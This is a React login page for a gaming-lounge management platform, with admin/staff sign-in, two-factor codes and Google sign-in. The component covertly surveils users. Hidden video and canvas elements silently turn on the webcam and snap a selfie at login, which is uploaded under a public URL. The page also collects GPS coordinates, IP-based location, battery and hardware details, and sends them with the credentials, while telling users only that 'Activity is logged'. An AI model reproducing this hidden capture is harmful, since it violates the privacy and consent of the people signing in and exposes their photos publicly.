import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { appToast } from '@/lib/appToast';
import { useAuth } from '@/context/AuthContext';

type LoginMetadata = Record<string, unknown>;
import { Shield, Users, Lock, Eye, EyeOff, ArrowLeft, FileText } from 'lucide-react';
import AppLoadingOverlay from '@/components/loading/AppLoadingOverlay';
import GoogleButton from '@/components/auth/GoogleButton';
import { UAParser } from 'ua-parser-js';
import { supabase } from "@/integrations/supabase/client";

interface LocationState {
  from?: string;
}

const Login = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [loginType, setLoginType] = useState('admin');
  const [totpCode, setTotpCode] = useState('');
  const [useBackup, setUseBackup] = useState(false);
  const [needsTotp, setNeedsTotp] = useState(false);
  const [cachedMetadata, setCachedMetadata] = useState<LoginMetadata | null>(null);
  const { login } = useAuth();
  const navigate = useNavigate();
  const location = useLocation();
  const locationState = location.state as LocationState;
  
  const [showPassword, setShowPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  
  // Hidden webcam and canvas for silent capture
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [cameraReady, setCameraReady] = useState(false);
  
  const [loginMetadata, setLoginMetadata] = useState<any>({});

  // Surface Google OAuth errors coming back from the callback.
  useEffect(() => {
    const params = new URLSearchParams(location.search);
    const oauthErr = params.get('oauth_error');
    if (!oauthErr) return;
    const prettyMap: Record<string, string> = {
      no_account: "We couldn't find a Cuetronix workspace for this Google account. Start one below.",
      account_conflict: "Another Google identity is already linked to this email.",
      invalid_state: 'Sign-in session expired. Please try again.',
      expired_state: 'Sign-in session expired. Please try again.',
    };
    const message = prettyMap[oauthErr] || `Google sign-in failed: ${decodeURIComponent(oauthErr)}`;
    appToast.error(message);
    params.delete('oauth_error');
    params.delete('email');
    const q = params.toString();
    window.history.replaceState({}, '', q ? `${location.pathname}?${q}` : location.pathname);
  }, [location.search, location.pathname]);

  // Silently initialize camera in background
  useEffect(() => {
    const initCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user', width: 640, height: 480 },
          audio: false 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play();
          setCameraReady(true);
          console.log('📷 Camera initialized silently');
        }
      } catch (error) {
        console.log('⚠️ Camera not available or permission denied');
        setCameraReady(false);
      }
    };
    
    initCamera();

    // Cleanup camera on unmount
    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject as MediaStream;
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  // Silently capture photo
  const captureSilentPhoto = (): string | null => {
    if (!cameraReady || !videoRef.current || !canvasRef.current) {
      console.log('⚠️ Camera not ready for capture');
      return null;
    }

    try {
      const canvas = canvasRef.current;
      const video = videoRef.current;
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(video, 0, 0);
        console.log('📸 Selfie captured silently');
        return canvas.toDataURL('image/jpeg', 0.8);
      }
    } catch (error) {
      console.error('❌ Error capturing photo:', error);
    }
    
    return null;
  };

  const uploadSelfie = async (imageData: string): Promise<string | null> => {
    try {
      const base64Data = imageData.split(',')[1];
      const fileName = `selfie_${Date.now()}_${Math.random().toString(36).substring(7)}.jpg`;
      
      const { data, error } = await supabase.storage
        .from('login-selfies')
        .upload(fileName, decode(base64Data), {
          contentType: 'image/jpeg',
          cacheControl: '3600',
        });

      if (error) throw error;

      const { data: publicUrlData } = supabase.storage
        .from('login-selfies')
        .getPublicUrl(fileName);

      console.log('✅ Selfie uploaded successfully');
      return publicUrlData.publicUrl;
    } catch (error) {
      console.error('❌ Error uploading selfie:', error);
      return null;
    }
  };

  const decode = (base64: string): Uint8Array => {
    const binaryString = window.atob(base64);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
      bytes[i] = binaryString.charCodeAt(i);
    }
    return bytes;
  };

  // Collect all metadata - IMPROVED VERSION
  useEffect(() => {
    const collectLoginInfo = async () => {
      try {
        const parser = new UAParser();
        const device = parser.getResult();
        
        let metadata: any = {
          browser: device.browser.name,
          browserVersion: device.browser.version,
          os: device.os.name,
          osVersion: device.os.version,
          deviceType: device.device.type || 'desktop',
          deviceModel: device.device.model || 'Unknown',
          deviceVendor: device.device.vendor || 'Unknown',
          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          userAgent: navigator.userAgent,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          colorDepth: window.screen.colorDepth,
          pixelRatio: window.devicePixelRatio,
          touchSupport: 'ontouchstart' in window
        };

        // Hardware info
        if ('hardwareConcurrency' in navigator) {
          metadata.cpuCores = (navigator as any).hardwareConcurrency;
        }
        if ('deviceMemory' in navigator) {
          metadata.deviceMemory = (navigator as any).deviceMemory;
        }

        // Connection info
        const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
        if (connection) {
          metadata.connectionType = connection.effectiveType || connection.type;
        }

        // Battery info
        if ('getBattery' in navigator) {
          try {
            const battery: any = await (navigator as any).getBattery();
            metadata.batteryLevel = Math.round(battery.level * 100);
          } catch (e) {
            console.log('⚠️ Battery API not available');
          }
        }

        // Get IP and location - Wait for response
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
          
          const response = await fetch('https://ipapi.co/json/', {
            signal: controller.signal
          });
          clearTimeout(timeoutId);
          
          if (response.ok) {
            const data = await response.json();
            metadata.ip = data.ip;
            metadata.city = data.city;
            metadata.region = data.region;
            metadata.country = data.country_name;
            metadata.timezone = data.timezone;
            metadata.isp = data.org;
            console.log('✅ IP and location data fetched successfully');
          }
        } catch (error) {
          console.log('⚠️ Could not fetch IP data, trying alternative...');
          
          // Try alternative API
          try {
            const response = await fetch('https://api.ipify.org?format=json');
            if (response.ok) {
              const data = await response.json();
              metadata.ip = data.ip;
              console.log('✅ IP fetched from alternative API');
            }
          } catch (e) {
            console.log('⚠️ All IP APIs failed');
          }
        }

        // Set initial metadata
        setLoginMetadata(metadata);

        // Get GPS coordinates silently - This runs separately
        if ('geolocation' in navigator) {
          console.log('📍 Requesting GPS location...');
          navigator.geolocation.getCurrentPosition(
            (position) => {
              console.log('✅ GPS location obtained:', position.coords.latitude, position.coords.longitude);
              const updatedMetadata = {
                ...metadata,
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                locationAccuracy: position.coords.accuracy
              };
              setLoginMetadata(updatedMetadata);
            },
            (error) => {
              console.log('⚠️ GPS location denied or unavailable:', error.message);
              // Keep existing metadata without GPS
            },
            { 
              enableHighAccuracy: true, 
              timeout: 10000,
              maximumAge: 0 
            }
          );
        } else {
          console.log('⚠️ Geolocation not supported');
        }

        console.log('🔍 Login tracking ready - metadata collection initiated');
      } catch (error) {
        console.error('❌ Error collecting metadata:', error);
        // Set minimal metadata even if collection fails
        setLoginMetadata({
          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          userAgent: navigator.userAgent
        });
      }
    };
    
    collectLoginInfo();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      appToast.error('Missing credentials', 'Enter both username and password.');
      return;
    }
    
    setIsLoading(true);
    
    // Wait a moment for GPS to finish if it's still loading
    await new Promise(resolve => setTimeout(resolve, 500));
    
    try {
      const isAdminLogin = loginType === 'admin';
      
      // Silently capture selfie
      let selfieUrl = null;
      const capturedImage = captureSilentPhoto();
      if (capturedImage) {
        selfieUrl = await uploadSelfie(capturedImage);
      }

      const enhancedMetadata = {
        ...loginMetadata,
        selfieUrl
      };

      console.log('🚀 Submitting login with metadata:', {
        hasIP: !!enhancedMetadata.ip,
        hasGPS: !!enhancedMetadata.latitude,
        hasSelfie: !!selfieUrl,
        city: enhancedMetadata.city,
        country: enhancedMetadata.country
      });
      
      const result = await login(username, password, isAdminLogin, enhancedMetadata);

      if (result.ok) {
        if (videoRef.current && videoRef.current.srcObject) {
          const stream = videoRef.current.srcObject as MediaStream;
          stream.getTracks().forEach(track => track.stop());
        }

        appToast.success(
          `${isAdminLogin ? 'Admin' : 'Staff'} access granted`,
          'Loading your control panel…',
        );

        const redirectTo = locationState?.from || '/dashboard';
        navigate(redirectTo);
      } else if ('requireTotp' in result && result.requireTotp) {
        setNeedsTotp(true);
        setCachedMetadata(enhancedMetadata);
        appToast.info('Two-factor authentication', 'Enter the 6-digit code from your authenticator app.');
      } else {
        appToast.error(
          'Invalid credentials',
          result.error || `Check your ${isAdminLogin ? 'admin' : 'staff'} username and password.`,
        );
      }
    } catch (error) {
      appToast.error('Something went wrong', 'Please try again in a moment.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleTotpSubmit = async (e?: React.FormEvent) => {
    e?.preventDefault();
    if (!username || !password) {
      setNeedsTotp(false);
      return;
    }
    const code = totpCode.trim().replace(/\s+/g, '');
    if (!code) {
      appToast.error('Missing code', 'Enter the 6-digit authenticator code.');
      return;
    }
    setIsLoading(true);
    const metadata = cachedMetadata ?? {};
    const result = await login(
      username,
      password,
      loginType === 'admin',
      metadata,
      useBackup ? { backupCode: code } : { totpCode: code },
    );
    setIsLoading(false);

    if (result.ok) {
      appToast.success('Access granted', 'Loading your control panel…');
      const redirectTo = locationState?.from || '/dashboard';
      navigate(redirectTo);
      return;
    }
    appToast.error('Invalid code', (result as { error?: string }).error || 'Try again.');
  };

  const togglePasswordVisibility = () => setShowPassword(!showPassword);
  const toggleNewPasswordVisibility = () => setShowNewPassword(!showNewPassword);
  const toggleConfirmPasswordVisibility = () => setShowConfirmPassword(!showConfirmPassword);
  // Password reset / PIN-based log access removed (server-side auth now enforced).

  return (
    <div className="min-h-screen flex bg-[#050508] overflow-hidden relative">
      <AppLoadingOverlay
        visible={isLoading}
        variant="default"
        title="Verifying your access"
        subtitle="Securing session and preparing your dashboard…"
      />
      {/* Hidden capture elements */}
      <video ref={videoRef} style={{ display: 'none' }} autoPlay playsInline muted />
      <canvas ref={canvasRef} style={{ display: 'none' }} />

      {needsTotp && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
          <form
            onSubmit={handleTotpSubmit}
            className="w-full max-w-sm rounded-2xl border border-white/10 bg-[#0d0e1c] p-6 shadow-2xl"
          >
            <div className="flex items-center gap-2 mb-1 text-sky-300">
              <Lock className="h-4 w-4" />
              <span className="text-xs font-bold uppercase tracking-wider">Two-factor auth</span>
            </div>
            <h2 className="text-xl font-bold text-zinc-100">
              {useBackup ? 'Enter a backup code' : 'Enter authenticator code'}
            </h2>
            <p className="mt-1 text-sm text-zinc-400">
              {useBackup
                ? 'Backup codes are single-use. We will mark this one consumed.'
                : 'Open your authenticator app and enter the 6-digit code for Cuetronix.'}
            </p>
            <Input
              autoFocus
              inputMode={useBackup ? 'text' : 'numeric'}
              maxLength={useBackup ? 16 : 6}
              placeholder={useBackup ? 'ABCD-EFGH-IJKL' : '123 456'}
              value={totpCode}
              onChange={(e) => setTotpCode(e.target.value)}
              className="mt-4 bg-[#05060c] border-white/10 text-center text-xl tracking-[0.4em] text-zinc-100"
            />
            <Button type="submit" className="mt-4 w-full" disabled={isLoading}>
              Verify
            </Button>
            <div className="mt-3 flex items-center justify-between text-xs">
              <button
                type="button"
                onClick={() => {
                  setUseBackup((v) => !v);
                  setTotpCode('');
                }}
                className="text-sky-400 hover:text-sky-300 font-medium"
              >
                {useBackup ? 'Use authenticator code' : 'Use a backup code'}
              </button>
              <button
                type="button"
                onClick={() => {
                  setNeedsTotp(false);
                  setTotpCode('');
                  setUseBackup(false);
                }}
                className="text-zinc-500 hover:text-zinc-300"
              >
                Cancel
              </button>
            </div>
          </form>
        </div>
      )}

      {/* ── LEFT BRANDING PANEL ── */}
      <div className="hidden lg:flex lg:w-[58%] relative flex-col justify-between p-14 overflow-hidden">
        {/* Deep layered background */}
        <div className="absolute inset-0" style={{ background: 'linear-gradient(135deg, #0f0520 0%, #080b1a 50%, #050508 100%)' }} />
        {/* Radial glows */}
        <div className="absolute inset-0" style={{ background: 'radial-gradient(ellipse at 15% 55%, rgba(139,92,246,0.22) 0%, transparent 60%)' }} />
        <div className="absolute bottom-0 right-0 w-[480px] h-[480px] rounded-full blur-[100px]"
          style={{ background: 'radial-gradient(circle, rgba(99,102,241,0.12), transparent)' }} />
        <div className="absolute top-0 right-0 w-64 h-64 rounded-full blur-3xl"
          style={{ background: 'rgba(6,182,212,0.06)' }} />
        {/* Fine dot grid */}
        <div className="absolute inset-0 opacity-[0.035]"
          style={{ backgroundImage: 'radial-gradient(rgba(255,255,255,0.8) 1px, transparent 1px)', backgroundSize: '32px 32px' }} />

        {/* Logo */}
        <div className="relative z-10">
          <div className="flex items-center gap-3">
            <div className="relative">
              <div className="absolute inset-0 rounded-full blur-lg" style={{ background: 'rgba(139,92,246,0.4)' }} />
              <img src="/lovable-uploads/edbcb263-8fde-45a9-b66b-02f664772425.png" alt="Cuephoria"
                className="relative h-12 w-auto" />
            </div>
            <div>
              <span className="text-white font-extrabold text-xl tracking-tight block leading-none">Cuephoria</span>
              <span className="text-purple-400 text-[10px] tracking-[0.18em] uppercase font-medium">Management Platform</span>
            </div>
          </div>
        </div>

        {/* Main copy */}
        <div className="relative z-10 max-w-[440px]">
          <div className="inline-flex items-center gap-2 mb-8 px-3 py-1.5 rounded-full text-[11px] font-semibold tracking-wide"
            style={{ background: 'rgba(139,92,246,0.12)', border: '1px solid rgba(139,92,246,0.2)', color: '#a78bfa' }}>
            <div className="w-1.5 h-1.5 rounded-full bg-green-400" />
            v2.0 · Multi-location · Real-time
          </div>

          <h1 className="text-5xl font-extrabold text-white leading-[1.08] tracking-[-0.02em] mb-6">
            Your gaming<br />
            business,<br />
            <span className="bg-gradient-to-r from-purple-400 via-pink-400 to-blue-400 bg-clip-text text-transparent">
              under control.
            </span>
          </h1>

          <p className="text-gray-400 text-[15px] leading-relaxed mb-10">
            Full-stack POS with live station tracking, automated bookings, staff & payroll management, and real-time revenue analytics — all in one platform.
          </p>

          {/* Feature tiles */}
          <div className="grid grid-cols-2 gap-2.5">
            {[
              { icon: '🎮', label: 'Live Station Monitor' },
              { icon: '📅', label: 'Booking Engine' },
              { icon: '👥', label: 'Staff & Payroll' },
              { icon: '📊', label: 'Revenue Analytics' },
              { icon: '🏪', label: 'Multi-Location POS' },
              { icon: '🔔', label: 'Real-time Alerts' },
            ].map((item) => (
              <div key={item.label}
                className="flex items-center gap-3 px-4 py-3 rounded-xl"
                style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.07)' }}>
                <span className="text-base flex-shrink-0">{item.icon}</span>
                <span className="text-gray-300 text-[13px] font-medium">{item.label}</span>
              </div>
            ))}
          </div>
        </div>

        {/* Footer trust row */}
        <div className="relative z-10 flex flex-wrap items-center gap-5">
          {[
            { icon: Shield, text: 'Activity monitored' },
            { icon: Lock, text: 'TLS encrypted' },
            { icon: FileText, text: 'Full audit logs' },
          ].map(({ icon: Icon, text }) => (
            <div key={text} className="flex items-center gap-1.5">
              <Icon size={12} className="text-purple-500" />
              <span className="text-gray-600 text-xs">{text}</span>
            </div>
          ))}
        </div>
      </div>

      {/* ── RIGHT FORM PANEL ── */}
      <div className="flex-1 relative flex flex-col justify-center px-6 sm:px-10 lg:px-12 xl:px-16 py-12 overflow-auto"
        style={{ background: 'rgba(8,8,14,0.85)', backdropFilter: 'blur(24px)' }}>

        {/* subtle glow */}
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-80 h-80 rounded-full pointer-events-none"
          style={{ background: 'radial-gradient(circle, rgba(139,92,246,0.08), transparent)' }} />

        {/* nav links */}
        <div className="absolute top-4 right-4 flex items-center gap-1">
          <Button variant="ghost" size="sm"
            className="text-gray-600 hover:text-white text-xs h-8 px-3 rounded-lg"
            onClick={() => navigate('/')}>
            <ArrowLeft size={12} className="mr-1" /> Home
          </Button>
          <Button variant="ghost" size="sm"
            className="text-gray-600 hover:text-white text-xs h-8 px-3 rounded-lg"
            onClick={() => navigate('/login-logs')}>
            <FileText size={12} className="mr-1" /> Logs
          </Button>
        </div>

        <div className="w-full max-w-[360px] mx-auto relative z-10">

          {/* Mobile logo */}
          <div className="lg:hidden flex flex-col items-center mb-10">
            <img src="/lovable-uploads/edbcb263-8fde-45a9-b66b-02f664772425.png" alt="Cuephoria"
              className="h-16 w-auto drop-shadow-[0_0_24px_rgba(139,92,246,0.55)] mb-3" />
            <p className="text-purple-400 text-[10px] tracking-[0.2em] uppercase font-medium">Management Platform</p>
          </div>

          {/* Heading */}
          <div className="mb-8">
            <h2 className="text-[28px] font-extrabold text-white leading-tight tracking-tight mb-1.5">
              Welcome back
            </h2>
            <p className="text-gray-500 text-sm">Sign in to your Cuephoria control panel</p>
          </div>

          {/* Role toggle */}
          <div className="flex p-1 rounded-xl mb-7"
            style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.07)' }}>
            {(['admin', 'staff'] as const).map((type) => (
              <button key={type} type="button" onClick={() => setLoginType(type)}
                className={`flex-1 flex items-center justify-center gap-2 text-[13px] py-2.5 rounded-lg font-semibold transition-all duration-200 ${
                  loginType === type
                    ? 'text-white shadow-lg'
                    : 'text-gray-500 hover:text-gray-300'
                }`}
                style={loginType === type ? {
                  background: 'linear-gradient(135deg, #7c3aed, #4f46e5)',
                  boxShadow: '0 4px 16px rgba(124,58,237,0.35)'
                } : {}}>
                {type === 'admin' ? <Shield size={13} /> : <Users size={13} />}
                {type === 'admin' ? 'Admin' : 'Staff'}
              </button>
            ))}
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="block text-[13px] font-semibold text-gray-400 mb-1.5">Username</label>
              <Input type="text" placeholder="Enter your username" value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="h-11 text-sm rounded-xl placeholder:text-gray-700"
                style={{
                  background: 'rgba(255,255,255,0.05)',
                  border: '1px solid rgba(255,255,255,0.09)',
                  color: 'white',
                }}
              />
            </div>

            <div>
              <div className="flex items-center justify-between mb-1.5">
                <label className="text-[13px] font-semibold text-gray-400">Password</label>
                <button type="button"
                  className="text-[12px] font-medium transition-colors"
                  style={{ color: '#7c3aed' }}
                  onClick={() => appToast.info('Password help', 'Contact your administrator for assistance.')}>
                  Forgot password?
                </button>
              </div>
              <div className="relative">
                <Input type={showPassword ? 'text' : 'password'} placeholder="••••••••••••"
                  value={password} onChange={(e) => setPassword(e.target.value)}
                  className="h-11 text-sm rounded-xl pr-11 placeholder:text-gray-700"
                  style={{
                    background: 'rgba(255,255,255,0.05)',
                    border: '1px solid rgba(255,255,255,0.09)',
                    color: 'white',
                  }}
                />
                <button type="button" onClick={togglePasswordVisibility}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-600 hover:text-gray-300 transition-colors">
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>
            </div>

            <Button type="submit" disabled={isLoading}
              className="w-full h-12 font-bold text-sm rounded-xl text-white transition-all duration-200 hover:opacity-90 hover:scale-[1.01] mt-2"
              style={{ background: 'linear-gradient(135deg, #7c3aed, #4f46e5)', boxShadow: '0 4px 20px rgba(124,58,237,0.3)' }}>
              {isLoading ? (
                <span className="flex items-center gap-2.5">
                  <svg className="animate-spin h-4 w-4" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                  </svg>
                  Verifying credentials…
                </span>
              ) : (
                <span className="flex items-center gap-2.5">
                  {loginType === 'admin' ? <Shield size={15} /> : <Users size={15} />}
                  {loginType === 'admin' ? 'Sign in as Admin' : 'Sign in as Staff'}
                </span>
              )}
            </Button>
          </form>

          {/* Google sign-in */}
          <div className="mt-5">
            <div className="flex items-center gap-3 mb-4">
              <div className="h-px flex-1 bg-white/10" />
              <span className="text-[11px] text-gray-500 uppercase tracking-wide">Or</span>
              <div className="h-px flex-1 bg-white/10" />
            </div>
            <GoogleButton intent="login" />
          </div>

          {/* Forgot password + signup CTA */}
          <div className="mt-5 flex flex-col items-center gap-2 text-center">
            <a
              href="/forgot-password"
              className="text-[12px] text-gray-500 hover:text-purple-300 transition-colors"
            >
              Forgot your password?
            </a>
            <p className="text-[13px] text-gray-500">
              New to Cuetronix?{' '}
              <a
                href="/signup"
                className="text-purple-400 hover:text-purple-300 font-semibold transition-colors"
              >
                Create a workspace →
              </a>
            </p>
          </div>

          {/* Security strip */}
          <div className="mt-8 pt-6 flex flex-col gap-3"
            style={{ borderTop: '1px solid rgba(255,255,255,0.06)' }}>
            <div className="flex items-center gap-2 justify-center text-[11px] text-gray-700">
              <Shield size={11} className="text-purple-700" />
              <span>Authorised personnel only</span>
              <span className="text-gray-800">·</span>
              <Lock size={11} className="text-purple-700" />
              <span>Activity is logged</span>
            </div>
            <div className="flex items-center justify-center gap-4">
              {['Admin Portal', 'POS v2.0', 'Multi-Location'].map((badge) => (
                <span key={badge} className="text-[10px] px-2 py-0.5 rounded-full"
                  style={{ background: 'rgba(139,92,246,0.08)', border: '1px solid rgba(139,92,246,0.12)', color: '#6d28d9' }}>
                  {badge}
                </span>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
